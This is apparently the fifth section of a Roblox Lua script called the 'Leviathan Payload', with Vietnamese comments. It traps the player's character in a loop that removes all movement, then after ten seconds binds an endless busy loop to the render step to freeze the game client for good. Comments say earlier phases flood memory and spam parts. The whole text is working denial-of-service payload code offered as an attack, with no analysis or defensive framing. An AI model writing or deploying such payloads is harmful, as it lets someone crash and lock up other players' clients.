-- PHÂN KHU 5: CHARACTER LOCKDOWN & FINAL FREEZE

local Lockdown = {}
Lockdown.__index = Lockdown

function Lockdown.trapCharacter()
    task.spawn(function()
        while true do
            local char = player.Character
            if char then
                pcall(function()
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if hum then
                        hum.WalkSpeed = 0
                        hum.JumpPower = 0
                        hum.PlatformStand = true
                    end
                    if root then
                        root.Anchored = true
                    end
                end)
            end
            task.wait(0.1)
        end
    end)
end

function Lockdown.finalFreeze()
    -- Đợi 10 giây cho Phase 1-4 bơm RAM và spam Part
    -- Sau đó khóa chết Main Thread
    task.delay(10, function()
        l:log("10 giây đã hết. Kích hoạt Final Freeze!")
        
        RunService.RenderStepped:Connect(function()
            -- Vòng lặp vô hạn, block vĩnh viễn render thread
            while true do
                -- Không làm gì, chỉ block
            end
        end)
    end)
end

Lockdown.trapCharacter()
Lockdown.finalFreeze()

l:log("Leviathan Payload đã kích hoạt toàn bộ các phân khu.")
